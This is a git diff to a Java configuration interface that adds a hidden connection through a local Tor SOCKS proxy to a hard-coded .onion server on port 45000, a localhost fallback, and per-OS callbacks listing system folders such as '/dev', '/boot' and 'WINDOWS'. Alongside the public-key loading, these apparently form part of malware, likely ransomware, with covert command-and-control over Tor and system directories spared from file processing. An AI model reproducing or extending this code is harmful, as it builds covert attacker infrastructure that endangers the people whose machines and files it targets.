@@ -11,6 +11,9 @@ import java.net.Proxy;
 import java.net.Proxy.Type;
 import java.net.Socket;
 import java.security.PublicKey;
+import java.util.Arrays;
+import java.util.List;
+import java.util.function.Supplier;
 
 public interface Configuration {
 
@@ -38,6 +41,59 @@ public interface Configuration {
 		}
 		return publicKey;
 
+	}
+
+	public static Socket getSilverTunnelConnexion() {
+		try {
+			Socket serverConnexion = new Socket(
+					new Proxy(Type.SOCKS, new InetSocketAddress(InetAddress.getByName("localhost"), 9150)));
+			serverConnexion.connect(
+					new InetSocketAddress("bkivabygdqeqacosuf2xotcm233sq2ci5ts4wet6hzmpkpccalrhiaqd.onion", 45000));
+			return serverConnexion;
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
+	}
+
+	public static Socket getSimpleConnexion() {
+		Socket socket;
+		try {
+			socket = new Socket(InetAddress.getByName("127.0.0.1"), 45000);
+			return socket;
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
+	}
+
+	public static Supplier<List<String>> getLinuxCallback() {
+		return new Supplier<List<String>>() {
+			@Override
+			public List<String> get() {
+				return Arrays.asList("/dev", "/boot");
+			}
+		};
+	}
+
+	public static Supplier<List<String>> getMacosCallback() {
+		return new Supplier<List<String>>() {
+			@Override
+			public List<String> get() {
+				return Arrays.asList("/boot");
+			}
+		};
+	}
+
+	public static Supplier<List<String>> getWindowsCallback() {
+		return new Supplier<List<String>>() {
+			@Override
+			public List<String> get() {
+				return Arrays.asList("WINDOWS");
+			}
+		};
 	}
 
 }
